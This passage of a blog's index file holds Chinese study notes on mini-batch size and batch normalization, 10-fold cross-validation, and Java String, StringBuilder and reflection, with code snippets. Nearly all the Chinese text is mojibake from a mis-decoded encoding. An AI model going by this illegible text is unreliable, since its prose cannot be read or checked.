href="https://link.zhihu.com/?target=https://mp.weixin.qq.com/s?__biz=MzIwNzc2NTk0NQ==&mid=2247484570&idx=1&sn=4c0b6b76a7f2518d77818535b677e087&chksm=970c2c4ca07ba55ad5cfe6b46f72dbef85a159574fb60b9932404e45747c95eed8c6c0f66d62%23rd">batch</a>) æ— æ³•ç»§ç»­ä¸‹é™ï¼Œåè€Œè¾¾ä¸åˆ°æœ€å°ã€‚è€Œä¸” GD æ¯ä¸€æ­¥çš„è®¡ç®—é‡å·¨å¤§ã€‚å³ä½¿æ˜¯å¯ä»¥æˆåŠŸå°†è®­ç»ƒé›†çš„ loss é™åˆ°æœ€ä½ï¼Œå¯æˆ‘ä»¬å¹¶ä¸å…³å¿ƒè®­ç»ƒé›†çš„è¡¨ç°ï¼Œæˆ‘ä»¬å…³å¿ƒçš„æ˜¯<strong>æµ‹è¯•é›†</strong>çš„è¡¨ç°ã€‚è®­ç»ƒé›†è¡¨ç°å¥½ï¼Œæµ‹è¯•é›†è¡¨ç°å·®çš„è¿‡æ‹Ÿåˆ (overfitting) å¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ã€‚<br>Stochastic Gradient Descent çš„éšæœºæ€§æœ‰åˆ©äºè·³å‡ºéç‚¹ï¼Œåˆå…·æœ‰åŠ å¼ºæ™®éæ€§ (æµ‹è¯•é›†ä¸Šè¡¨ç°ä¼˜ç§€) çš„ä½œç”¨ã€‚å¯è§‚çœ‹ä»¥ä¸‹è§†é¢‘æ„Ÿå— <strong>SGD å¦‚ä½•ç¼“è§£é™·å…¥å±€éƒ¨æœ€å°å€¼</strong><br><a href="https://video.zhihu.com/video/1031175825587978240">https://video.zhihu.com/video/1031175825587978240?</a><br>å¯æƒœè®­ç»ƒè€—æ—¶ï¼ŒåŒæ—¶è¿‡å¤§çš„æ ·æœ¬å·®å¼‚ä¼šä½¿è®­ç»ƒæ¯”è¾ƒéœ‡è¡ï¼Œæ‰€ä»¥æœ‰äº† Minibatch Gradient Descent æ–¹æ³•ï¼ŒåŒæ—¶å…·æœ‰äºŒè€…çš„ç‰¹ç‚¹ï¼Œæ˜¯ä»¥ n ä¸ªæ ·æœ¬ç®—å‡ºçš„æ¢¯åº¦çš„å¹³å‡å€¼æ¥æ›´æ–°æ¯ä¸€æ­¥ã€‚ç„¶è€Œä¸å¾—ä¸è‹¦é€¼çš„æ ¹æ®ä¸åŒçš„ä»»åŠ¡å»å¯»æ‰¾æœ€ä¼˜çš„ n ã€‚ä¸è¿‡åœ¨è®¡ç®—æœºè§†è§‰ä¸­ï¼Œç”±äº batch normalization çš„å¸®åŠ©ï¼Œå¯ä»¥ä½¿ç”¨æå¤§çš„ batch sizeï¼Œè¿™æ—¶çš„ batch size å¾€å¾€æ˜¯å—é™äº GPU çš„æ˜¾å­˜å¤§å°ã€‚</p><hr><h2 id="ä¸ªäººç»éªŒåˆ†äº«"><a href="#ä¸ªäººç»éªŒåˆ†äº«" class="headerlink" title="ä¸ªäººç»éªŒåˆ†äº«"></a>ä¸ªäººç»éªŒåˆ†äº«</h2><p>ä¸ªäººä¹ æƒ¯ä» batch size ä»¥ 128 ä¸ºåˆ†ç•Œçº¿ã€‚å‘ä¸‹ (x0.5) å’Œå‘ä¸Š (x2) è®­ç»ƒåæ¯”è¾ƒæµ‹è¯•ç»“æœã€‚è‹¥å‘ä¸‹æ›´å¥½åˆ™å† x0.5ï¼Œç›´åˆ°ç»“æœä¸å†æå‡ã€‚<br>æˆ‘é‡åˆ°è¿‡å¾ˆå¤šæƒ…å†µã€‚<br>æ¯”å¦‚åŒæ ·çš„ cnn+rnn æ¨¡å‹ç»“æ„ï¼Œadam æ›´æ–°æ³•ï¼Œlearning rate å’Œå…¶ä»–å‚æ•°å…¨éƒ¨ç›¸åŒã€‚</p><ul><li><strong>ä¾‹1ï¼š</strong>é‡åˆ°æŸä¸ªè¯­éŸ³ã€ç”»é¢ã€è‡ªç„¶è¯­è¨€ä¸åŒä»»åŠ¡æ—¶ï¼Œæœ€å¥½çš„ batch size åˆ†åˆ«ä¸º 8, 32, 16ã€‚</li><li><strong>ä¾‹2ï¼š</strong>é‡åˆ°æŸä¸ªå¤šä¿¡å·è¯­éŸ³è¯†åˆ«ä»»åŠ¡æ—¶ï¼Œ <strong>batch size ä¸º 1 æœ€å¥½</strong>ï¼Œå¯æ˜¯è®­ç»ƒæ—¶é—´è®©äººæŠ“ç‹‚ï¼Œå°¤å…¶æ˜¯ä½¿ç”¨å¾ªç¯ç½‘ç»œæ—¶ã€‚è€Œå°†è¿™äº›å¤šä¸ªä¿¡å·ä¹‹é—´åš inversion mapping æ—¶ï¼Œç»“æœå´æ˜¯ batch size è®¾ä¸º 32 åæ•ˆæœä¾ç„¶æå‡ï¼Œä½†ç”±äº GPU æ˜¾å­˜é™åˆ¶æ— æ³•ç»§ç»­åŠ å¤§ batch sizeã€‚</li></ul><p>å¯ä»¥çœ‹å‡ºæ¥ï¼Œè°ƒå‚ä¹Ÿæœ‰æ—¶é—´å’Œç©ºé—´çš„é™åˆ¶ï¼š</p><blockquote><p><strong>å¤§ batch size é™äºç©ºé—´ï¼Œå° batch size è‹¦äºæ—¶é—´ã€‚</strong></p></blockquote><hr><h2 id="ä¸ºä»€ä¹ˆ-batch-size-ä¼šå½±å“è®­ç»ƒç»“æœ"><a href="#ä¸ºä»€ä¹ˆ-batch-size-ä¼šå½±å“è®­ç»ƒç»“æœ" class="headerlink" title="ä¸ºä»€ä¹ˆ batch size ä¼šå½±å“è®­ç»ƒç»“æœ"></a>ä¸ºä»€ä¹ˆ batch size ä¼šå½±å“è®­ç»ƒç»“æœ</h2><p><a href="https://www.zhihu.com/people/c4cfdf10563bff74ebf3e58d9f1c8592">@Unstoppable</a> æœ‰é—®åˆ°â€œä¸€ç›´å¾ˆéš¾ç†è§£ä¸ºä»€ä¹ˆ batch size ä¼šå½±å“è®­ç»ƒç»“æœï¼Œç­”ä¸»èƒ½è§£è¯»ä¸€ä¸‹ä¹ˆâ€ã€‚<br>ä¸¾ä¸€ä¸ªç‰¹åˆ«ç®€åŒ–çš„ä¾‹å­ã€‚<br>å‡å¦‚è¦å­¦ä¹ ä¸€ä¸ªf:x-&gt;yå»æ‹Ÿåˆä¸‹é¢è¿™æ ·çš„ä¸€ç»´æ•°æ®ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚æœ‰ 6 ä¸ªè®­ç»ƒæ ·æœ¬ (ç¼–å· 1,2,3,4,5,6)ã€‚<br><img src="https://z3.ax1x.com/2021/06/16/2Lm82D.jpg"><br>å¦‚æœä½¿ç”¨ Gradient Descentï¼Œé‚£ä¹ˆæ¯ä¸€æ­¥çš„æ›´æ–°éƒ½ä¼šå‘ç±»ä¼¼äºé»„çº¿é‚£ç§åŒæ—¶æ»¡è¶³ 6 ä¸ªæ ·æœ¬çš„ f å»è´´è¿‘ (ä¸æ˜¯ä¸€æ­¥åˆ°ä½ï¼Œè€Œæ˜¯ä¸€ç‚¹ç‚¹æ›´æ–°å˜å½¢)ã€‚<br>å¦‚æœä½¿ç”¨ Stochastic Gradient Descentï¼Œé‚£ä¹ˆæ¯ä¸€æ­¥çš„æ›´æ–°éƒ½ä¼šå‘èƒ½ç©¿è¿‡è¯¥æ ·æœ¬ç‚¹çš„f å»è´´è¿‘ã€‚<br>å¦‚æœä½¿ç”¨ 3-Batch Gradient Descentï¼Œé‚£ä¹ˆæ¯ä¸€æ­¥éƒ½ä¼šå‘åŒæ—¶æ»¡è¶³ 3 ä¸ªæ ·æœ¬ç‚¹çš„å½¢çŠ¶æ›´æ–°ï¼Œæ¯”å¦‚ 1,2,3 æ ·æœ¬ç»„æˆçš„ batch ä¼šå¾€é»‘è‰²è™šçº¿çš„å½¢çŠ¶å˜åŒ–ã€‚ä¸‹ä¸€æ­¥å¯èƒ½æ˜¯å‘åŒæ—¶æ»¡è¶³ 1,5,6 çš„ batch çš„å½¢çŠ¶å»å˜åŒ–ã€‚<br>åŒç†ï¼Œè‹¥ä½¿ç”¨ 2-Batch Gradient Descentï¼Œç»¿è‰²è™šçº¿æ˜¯ä¾‹å­ã€‚<br>æ‰“ä¸ªæ¯”æ–¹ã€‚è¿™å¥½æ¯”ç´ æç»˜ç”»ï¼Œä¸åŒçš„ batch ç­–ç•¥å†³å®šäº†ç”¨ä»€ä¹ˆæ ·çš„çº¿æ¡ (çº¿æ®µã€æ›²çº¿æ®µã€è§’åº¦ç­‰) å»æç»˜ (å…è®¸è¦†ç›–å·²ç”»çš„çº¿æ¡)ï¼Œæœ€åç”»å‡ºçš„å›¾å½¢æ˜¯ç”±è¿™äº›çº¿æ¡æ„æˆçš„ã€‚ç¥ç»ç½‘ç»œè®­ç»ƒæ‰€å¾—çš„ f ä¹Ÿæ˜¯æ ¹æ®æ¢¯åº¦ (ç±»æ¯”çº¿æ¡) ä¸€ç‚¹ç‚¹æ›´æ–°å‡ºæ¥çš„ã€‚æ‰€ä»¥èƒ½å¤Ÿå½±å“æ¢¯åº¦çš„ batch size ä¼šå½±å“ç¥ç»ç½‘ç»œè®­ç»ƒå‡ºçš„ f ã€‚<br>è¯šç„¶ç”¨ Gradient Descent åŒæ—¶å‚è€ƒæ‰€æœ‰çš„è®­ç»ƒæ ·æœ¬å»é€‰æ‹©ç»˜ç”»çº¿æ¡çš„è¯ï¼Œæ„Ÿè§‰ä¸Šæœ€èƒ½å¤Ÿç”»å‡ºæ‹Ÿåˆæ‰€æœ‰è®­ç»ƒé›†æ ·æœ¬çš„å½¢çŠ¶ï¼Œä½†æ˜¯è¿™æ ·ä¼šä½¿æ¯æ¬¡ç»˜ç”»çš„çº¿æ¡ä»ç»˜ç”»å¼€å§‹åˆ°ç»“æŸéƒ½æ˜¯ä¸€æ ·çš„ (å¯¹åº”ç¥ç»ç½‘ç»œé™·å…¥éç‚¹)ï¼Œä»…ä»…æ˜¯ä¸æ–­çš„æç²—çº¿æ¡ï¼Œåè€Œå®¹æ˜“ç”»ä¸å‡ºæƒ³è¦çš„å½¢çŠ¶ã€‚å³ä¾¿æ˜¯èƒ½å¤ŸæˆåŠŸç”»å‡ºï¼Œä½†åˆ«å¿˜äº†ï¼Œæˆ‘ä»¬çœŸæ­£æƒ³è¦ç”»çš„<strong>å½¢çŠ¶æ˜¯è¿åŒæµ‹è¯•æ ·æœ¬åœ¨å†…çš„ (ç¼–å· a,b) ä¹ŸåŒæ—¶æ»¡è¶³çš„Â f</strong>ã€‚<br>å¯ä»¥æŠŠç¥ç»ç½‘ç»œçš„è®­ç»ƒæƒ³è±¡æˆä¸€ç§ç‰¹æ®Šçš„ç»˜ç”»ã€‚ç»˜ç”»è¿‡ç¨‹ä¸­ä¸å…è®¸ä½¿ç”¨æµ‹è¯•æ ·æœ¬ä½œä¸ºå‚è€ƒï¼Œåªå…è®¸ç”¨<strong>æœ‰é™çš„</strong>è®­ç»ƒæ ·æœ¬ä½œä¸ºå‚è€ƒï¼Œè¿˜è¦æ±‚æ‰€ç”»çš„å½¢çŠ¶è¦†ç›–æµ‹è¯•æ ·æœ¬ã€‚</p><hr><h2 id="Tensorflow-Playground-æ¼”ç¤º"><a href="#Tensorflow-Playground-æ¼”ç¤º" class="headerlink" title="Tensorflow Playground æ¼”ç¤º"></a><a href="https://link.zhihu.com/?target=http://playground.tensorflow.org/">Tensorflow Playground</a> æ¼”ç¤º</h2><p>æˆ‘ä»¬å¯ä»¥ç”¨<a href="https://link.zhihu.com/?target=http://playground.tensorflow.org/">Tensorflow â€” Neural Network Playground</a>æ¥å®é™…çš„ä½“éªŒä¸€ä¸‹è¿™ç§â€œç»˜ç”»â€è¿‡ç¨‹ã€‚</p><hr><h2 id="å…³äºBatch-Normalization"><a href="#å…³äºBatch-Normalization" class="headerlink" title="å…³äºBatch Normalization"></a>å…³äºBatch Normalization</h2><p>Batch Normalizationæ˜¯2015å¹´ä¸€ç¯‡è®ºæ–‡ä¸­æå‡ºçš„æ•°æ®å½’ä¸€åŒ–æ–¹æ³•ï¼Œå¾€å¾€ç”¨åœ¨æ·±åº¦ç¥ç»ç½‘ç»œä¸­æ¿€æ´»å±‚ä¹‹å‰ã€‚å…¶ä½œç”¨å¯ä»¥åŠ å¿«æ¨¡å‹è®­ç»ƒæ—¶çš„æ”¶æ•›é€Ÿåº¦ï¼Œä½¿å¾—æ¨¡å‹è®­ç»ƒè¿‡ç¨‹æ›´åŠ ç¨³å®šï¼Œé¿å…æ¢¯åº¦çˆ†ç‚¸æˆ–è€…æ¢¯åº¦æ¶ˆå¤±ã€‚å¹¶ä¸”èµ·åˆ°ä¸€å®šçš„æ­£åˆ™åŒ–ä½œç”¨ï¼Œå‡ ä¹ä»£æ›¿äº†Dropoutã€‚</p>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åæŠ˜äº¤å‰éªŒè¯</title>
      <link href="/2021/06/16/%E5%8D%81%E6%8A%98%E4%BA%A4%E5%8F%89%E9%AA%8C%E8%AF%81_(1)/"/>
      <url>/2021/06/16/%E5%8D%81%E6%8A%98%E4%BA%A4%E5%8F%89%E9%AA%8C%E8%AF%81_(1)/</url>
      
        <content type="html"><![CDATA[<blockquote><p>  åæŠ˜äº¤å‰éªŒè¯ï¼Œè‹±æ–‡åå«åš10-fold cross-validationï¼Œç”¨æ¥æµ‹è¯•ç®—æ³•å‡†ç¡®æ€§ã€‚æ˜¯å¸¸ç”¨çš„æµ‹è¯•æ–¹æ³•ã€‚å°†æ•°æ®é›†åˆ†æˆåä»½ï¼Œè½®æµå°†å…¶ä¸­9ä»½ä½œä¸ºè®­ç»ƒæ•°æ®ï¼Œ1ä»½ä½œä¸ºæµ‹è¯•æ•°æ®ï¼Œè¿›è¡Œè¯•éªŒã€‚</p></blockquote><blockquote><p>  æ¯æ¬¡è¯•éªŒéƒ½ä¼šå¾—å‡ºç›¸åº”çš„æ­£ç¡®ç‡ï¼ˆæˆ–å·®é”™ç‡ï¼‰ã€‚10æ¬¡çš„ç»“æœçš„æ­£ç¡®ç‡ï¼ˆæˆ–å·®é”™ç‡ï¼‰çš„å¹³å‡å€¼ä½œä¸ºå¯¹ç®—æ³•ç²¾åº¦çš„ä¼°è®¡ï¼Œä¸€èˆ¬è¿˜éœ€è¦è¿›è¡Œå¤šæ¬¡10æŠ˜äº¤å‰éªŒè¯ï¼ˆä¾‹å¦‚10æ¬¡10æŠ˜äº¤å‰éªŒè¯ï¼‰ï¼Œå†æ±‚å…¶å‡å€¼ï¼Œä½œä¸ºå¯¹ç®—æ³•å‡†ç¡®æ€§çš„ä¼°è®¡ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬13ç«  å­—ç¬¦ä¸²</title>
      <link href="/2021/06/16/%E7%AC%AC13%E7%AB%A0_%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2021/06/16/%E7%AC%AC13%E7%AB%A0_%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<h2 id="13-1-ä¸å¯å˜String"><a href="#13-1-ä¸å¯å˜String" class="headerlink" title="13.1 ä¸å¯å˜String"></a>13.1 ä¸å¯å˜String</h2><p><strong>Stringç±»ä¸­ä¿®æ”¹Stringçš„æ–¹æ³•éƒ½æ˜¯åˆ›å»ºæ–°çš„Stringï¼Œæœ€åˆçš„Stringä¸å˜</strong><br>**</p><h2 id="13-2-Stringä¸­â€™-â€™-å’ŒStringBuilder"><a href="#13-2-Stringä¸­â€™-â€™-å’ŒStringBuilder" class="headerlink" title="13.2 Stringä¸­â€™+â€™ å’ŒStringBuilder"></a>13.2 Stringä¸­â€™+â€™ å’ŒStringBuilder</h2><p><strong>Stringä¸­çš„ â€˜+â€™ æ¯æ¬¡ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨ä¼˜åŒ–åˆ›å»ºä¸€ä¸ªStringBuilderå¯¹è±¡ï¼Œä½¿ç”¨å…¶appendï¼ˆï¼‰æ–¹æ³•ã€‚</strong></p><blockquote><p><strong>â€˜+â€™ å’ŒStringBuilderä½¿ç”¨åœºæ™¯ï¼š</strong></p><ul><li><strong>è‹¥å¯¹å­—ç¬¦ä¸²æ“ä½œæ¯”è¾ƒç®€å•ï¼Œå¯ä»¥ç”¨ â€˜+â€™ ï¼Œä¿¡èµ–ç¼–è¯‘å™¨è‡ªåŠ¨ä¼˜åŒ–</strong></li><li><strong>è‹¥éœ€è¦ç”¨å¾ªç¯å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ“ä½œï¼Œæœ€å¥½è‡ªå·±åˆ›å»ºStringBuilderå¯¹è±¡</strong></li></ul></blockquote><h3 id="StringBuilderå¸¸ç”¨æ–¹æ³•"><a href="#StringBuilderå¸¸ç”¨æ–¹æ³•" class="headerlink" title="StringBuilderå¸¸ç”¨æ–¹æ³•"></a>StringBuilderå¸¸ç”¨æ–¹æ³•</h3><blockquote><ul><li><strong>Stringbuilder insert(int offset , String s/char c)          åœ¨ä½ç½®ä¹‹å‰æ’å…¥Stringæˆ–char</strong></li><li><strong>Stringbuilder append(String s)                                  å­—ç¬¦ä¸²æ‹¼æ¥</strong></li><li><strong>Stringbuilder replace(int start , int end , String s) Â  Â Â   æ›¿æ¢[ , ) å­—ç¬¦ä¸²</strong></li><li><strong>Stringbuilder delete(int start , int end) Â  Â Â                   åˆ é™¤[ , ) å­—ç¬¦ä¸²</strong></li><li><strong>String toString()                                                      è¿”å›å­—ç¬¦ä¸²</strong></li></ul></blockquote><h2 id="13-4-Stringå¸¸ç”¨æ–¹æ³•"><a href="#13-4-Stringå¸¸ç”¨æ–¹æ³•" class="headerlink" title="13.4 Stringå¸¸ç”¨æ–¹æ³•"></a>13.4 Stringå¸¸ç”¨æ–¹æ³•</h2><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/181445/2/9464/261049/60c94bfdE276da18f/707e4518ef45b22c.png"></p>]]></content>
      
      
      <categories>
          
          <category> javaç¼–ç¨‹æ€æƒ³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬14ç«  åå°„</title>
      <link href="/2021/06/16/%E7%AC%AC14%E7%AB%A0_%E5%8F%8D%E5%B0%84(1)/"/>
      <url>/2021/06/16/%E7%AC%AC14%E7%AB%A0_%E5%8F%8D%E5%B0%84(1)/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯åå°„ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯åå°„ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯åå°„ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯åå°„ï¼Ÿ</h2><p><strong>åå°„æ˜¯åœ¨è¿è¡Œæ—¶åŠ¨æ€è®¿é—®ç±»å’Œå¯¹è±¡çš„æŠ€æœ¯</strong></p><h2 id="ä¸ºä»€ä¹ˆè¦ç”¨åå°„ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆè¦ç”¨åå°„ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¦ç”¨åå°„ï¼Ÿ"></a>ä¸ºä»€ä¹ˆè¦ç”¨åå°„ï¼Ÿ</h2><blockquote><ul><li><strong>å®ä¾‹åŒ–å¯¹è±¡ç”¨newå…³é”®å­—ï¼Œä½†æ˜¯è¿™æ ·å°±æŠŠå®ä¾‹åŒ–çš„å·¥ä½œå›ºå®šåœ¨ç¨‹åºä¸­ï¼Œä¸çµæ´»ä¼šå‡ºç°å„ç§é—®é¢˜ã€‚</strong></li><li><strong>åå°„å¯ä»¥å°†åˆ›å»ºå¯¹è±¡çš„æ—¶æœºä»ç¼–è¯‘æ—¶å»¶è¿Ÿåˆ°ç¨‹åºè¿è¡Œæ—¶</strong></li><li><strong>å½“æ·»åŠ æ–°çš„åŠŸèƒ½æ—¶ï¼Œå¦‚æœä¸ç”¨åå°„å°†éœ€è¦ä¿®æ”¹ä»£ç ï¼Œä¿®æ”¹å®Œéœ€è¦é‡æ–°ä¸Šçº¿éå¸¸éº»çƒ¦ï¼Œè€Œç”¨åå°„åˆ™æ²¡æœ‰è¿™ä¸ªé—®é¢˜</strong></li></ul></blockquote><h2 id="14-2-Classå¯¹è±¡"><a href="#14-2-Classå¯¹è±¡" class="headerlink" title="14.2 Classå¯¹è±¡"></a>14.2 Classå¯¹è±¡</h2><blockquote><p><strong>åœ¨ç¨‹åºè¿è¡Œæ—¶ï¼ŒClasså¯¹è±¡ä¿å­˜äº†ç±»å’Œå¯¹è±¡çš„å…·ä½“ä¿¡æ¯ã€‚</strong><br><strong>æ¯ä¸ªç±»éƒ½æœ‰ä¸€ä¸ªClasså¯¹è±¡ï¼Œæ¯å½“ç¼–è¯‘ä¸€ä¸ªç±»ï¼Œå³.javaç¼–è¯‘æˆ.classæ–‡ä»¶ï¼Œå°±ä¼šäº§ç”Ÿä¸€ä¸ªClasså¯¹è±¡ä¿å­˜åœ¨.classæ–‡ä»¶ä¸­</strong></p></blockquote><h2 id="ç±»åŠ è½½å™¨ï¼š"><a href="#ç±»åŠ è½½å™¨ï¼š" class="headerlink" title="ç±»åŠ è½½å™¨ï¼š"></a>ç±»åŠ è½½å™¨ï¼š</h2><blockquote><p><strong>javaç¨‹åºåœ¨è¿è¡Œä¹‹å‰å¹¶éå®Œå…¨åŠ è½½ï¼š</strong></p><ul><li><strong>ç¬¬ä¸€æ¬¡ä½¿ç”¨è¿™ä¸ªç±»ï¼Œå°±åŠ¨æ€åŠ è½½åˆ°JVMä¸­ã€‚å½“åˆ›å»ºç¬¬ä¸€ä¸ªå¯¹ç±»çš„é™æ€æˆå‘˜çš„å¼•ç”¨æˆ–è€…æ„é€ å™¨æ—¶å°±ä¼šåŠ è½½è¿™ä¸ªç±»</strong></li></ul></blockquote><blockquote><p><strong>ç±»åŠ è½½å™¨å·¥ä½œæ­¥éª¤ï¼š</strong></p><ol><li><strong>é¦–å…ˆæ£€æŸ¥ä¸€ä¸ªç±»çš„Classå¯¹è±¡ï¼ˆæˆ–ç†è§£.classæ–‡ä»¶ï¼‰æ˜¯å¦å·²è¢«åŠ è½½</strong></li><li><strong>å¦‚æœå°šæœªåŠ è½½ï¼Œé»˜è®¤çš„ç±»åŠ è½½å™¨å°±ä¼šæ ¹æ®ç±»åæŸ¥æ‰¾.classæ–‡ä»¶</strong></li><li><strong>ä¸€æ—¦Classå¯¹è±¡ï¼ˆ.classæ–‡ä»¶ï¼‰è¢«åŠ è½½äº†ï¼ˆè½½å…¥jvmï¼‰ï¼Œå®ƒå°±è¢«ç”¨æ¥åˆ›å»ºè¿™ä¸ªç±»çš„æ‰€æœ‰å¯¹è±¡</strong></li></ol></blockquote><h3 id="è·å–Classå¯¹è±¡çš„å¼•ç”¨"><a href="#è·å–Classå¯¹è±¡çš„å¼•ç”¨" class="headerlink" title="è·å–Classå¯¹è±¡çš„å¼•ç”¨"></a>è·å–Classå¯¹è±¡çš„å¼•ç”¨</h3><blockquote><p><code>**Classå¯¹è±¡ = Class.forName(&quot;...&quot; )**</code><strong>å¯ä»¥è¿”å›æŒ‡å®šClasså¯¹è±¡çš„å¼•ç”¨ï¼Œå¹¶ä¸”è‹¥æŒ‡å®šçš„ç±»æ²¡æœ‰è¢«åŠ è½½ï¼Œå°±åŠ è½½å®ƒ</strong><br><strong>å¦‚æœæ²¡æœ‰Classå¯¹è±¡ï¼Œå¯ä»¥ç”¨forNameè·å–ã€‚å¦‚æœå·²ç»æœ‰ä¸€ä¸ªClasså¯¹è±¡ï¼Œåˆ™å¯ä»¥ç”¨<code>getClassï¼ˆ)</code> æ–¹æ³•è·å–Classå¼•ç”¨</strong></p></blockquote><hr><h2 id="Classå¸¸ç”¨æ–¹æ³•"><a href="#Classå¸¸ç”¨æ–¹æ³•" class="headerlink" title="Classå¸¸ç”¨æ–¹æ³•"></a>Classå¸¸ç”¨æ–¹æ³•</h2><blockquote><ul><li><strong>Class.forName(â€œClass pathâ€)  Â  Â Â  Â Â   è·å–æŒ‡å®šClasså¯¹è±¡</strong></li><li>**Classå¯¹è±¡.newInstance()                  ä½¿ç”¨é»˜è®¤æ„é€ å™¨æ„é€ å¯¹è±¡ **</li><li><strong>Classå¯¹è±¡.getConstructor()              è·å–æŒ‡å®šçš„ publicä¿®é¥°æ„é€ æ–¹æ³• Constructorå¯¹è±¡</strong></li><li><strong>Classå¯¹è±¡.getMethod()                    è·å–æŒ‡å®šçš„ publicä¿®é¥°æ–¹æ³• Methodå¯¹è±¡</strong></li><li><strong>Classå¯¹è±¡.getField()Â  Â Â                     è·å–æŒ‡å®šçš„ publicä¿®é¥°æˆå‘˜å˜é‡ Fieldå¯¹è±¡</strong></li></ul></blockquote><h2 id="ä½¿ç”¨å¸¦å‚æ„é€ æ–¹æ³•åˆ›å»ºå¯¹è±¡ï¼ˆåå°„ï¼‰"><a href="#ä½¿ç”¨å¸¦å‚æ„é€ æ–¹æ³•åˆ›å»ºå¯¹è±¡ï¼ˆåå°„ï¼‰" class="headerlink" title="ä½¿ç”¨å¸¦å‚æ„é€ æ–¹æ³•åˆ›å»ºå¯¹è±¡ï¼ˆåå°„ï¼‰"></a>ä½¿ç”¨å¸¦å‚æ„é€ æ–¹æ³•åˆ›å»ºå¯¹è±¡ï¼ˆåå°„ï¼‰</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Class <span class="class"><span class="keyword">class</span>å¯¹è±¡ </span>= Class.forName(<span class="string">&quot; Classè·¯å¾„ &quot;</span>);</span><br><span class="line">Constructor constructor = <span class="class"><span class="keyword">class</span>å¯¹è±¡.<span class="title">getConstructor</span>(<span class="title">new</span> <span class="title">Class</span>[]</span>&#123; <span class="comment">//é€šè¿‡æ„é€ å™¨çš„å‚æ•°è·å–æ„é€ å™¨å¯¹è±¡</span></span><br><span class="line"><span class="comment">//å¸¦å‚æ„é€ å™¨çš„å‚æ•°</span></span><br><span class="line">    String.class , Float.class,...</span><br><span class="line">&#125;);</span><br><span class="line">E ç±»çš„å¯¹è±¡ = (E) constructor.newInstance(<span class="keyword">new</span> Object[]&#123; <span class="comment">//é€šè¿‡æ„é€ å™¨å¯¹è±¡</span></span><br><span class="line">    <span class="comment">//ä¼ é€’å‚æ•°ç»™å¸¦å‚æ„é€ å™¨</span></span><br><span class="line">    <span class="string">&quot;...&quot;</span>,...,<span class="string">&quot;...&quot;</span>,...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨åå°„è°ƒç”¨æ–¹æ³•"><a href="#ä½¿ç”¨åå°„è°ƒç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨åå°„è°ƒç”¨æ–¹æ³•"></a>ä½¿ç”¨åå°„è°ƒç”¨æ–¹æ³•</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class <span class="class"><span class="keyword">class</span>å¯¹è±¡ </span>= Class.forName(<span class="string">&quot; Classè·¯å¾„ &quot;</span>);</span><br><span class="line">Method method = <span class="class"><span class="keyword">class</span>å¯¹è±¡.<span class="title">getMethod</span>(&quot;æ–¹æ³•å&quot;,<span class="title">new</span> <span class="title">Class</span>[]</span>&#123;</span><br><span class="line"><span class="comment">//æ„é€ å™¨çš„å‚æ•°</span></span><br><span class="line">    String.class , Float.class,...</span><br><span class="line">&#125;); <span class="comment">//é€šè¿‡æ–¹æ³•åå’Œæ–¹æ³•çš„å‚æ•°è·å–æ–¹æ³•å¹¶è¿”å›æ–¹æ³•å¯¹è±¡</span></span><br><span class="line">method.invoke(ç±»çš„å¯¹è±¡,å‚æ•°...);<span class="comment">//é€šè¿‡å“ªä¸ªç±»çš„å¯¹è±¡è°ƒç”¨è¿™ä¸ªæ–¹æ³•ä»¥åŠæ–¹æ³•å‚æ•°æ¥æ‰§è¡Œæ–¹æ³•</span></span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨åå°„è·å–æˆå‘˜å¯¹è±¡"><a href="#ä½¿ç”¨åå°„è·å–æˆå‘˜å¯¹è±¡" class="headerlink" title="ä½¿ç”¨åå°„è·å–æˆå‘˜å¯¹è±¡"></a>ä½¿ç”¨åå°„è·å–æˆå‘˜å¯¹è±¡</h2><p><strong>è·å–åˆ°æˆå‘˜å¯¹è±¡åå¯ä»¥é€šè¿‡getæˆ–è€…setè·å–æ•°æ®æˆ–ä¿®æ”¹æ•°æ®</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class <span class="class"><span class="keyword">class</span>å¯¹è±¡ </span>= Class.forName(<span class="string">&quot; Classè·¯å¾„ &quot;</span>);</span><br><span class="line">Field field = <span class="class"><span class="keyword">class</span>å¯¹è±¡.<span class="title">getField</span>(&quot;æˆå‘˜å¯¹è±¡å&quot;)</span>; <span class="comment">// é€šè¿‡å˜é‡åè·å–æˆå‘˜å¯¹è±¡</span></span><br><span class="line">print(field.get(ç±»çš„å¯¹è±¡)); <span class="comment">// 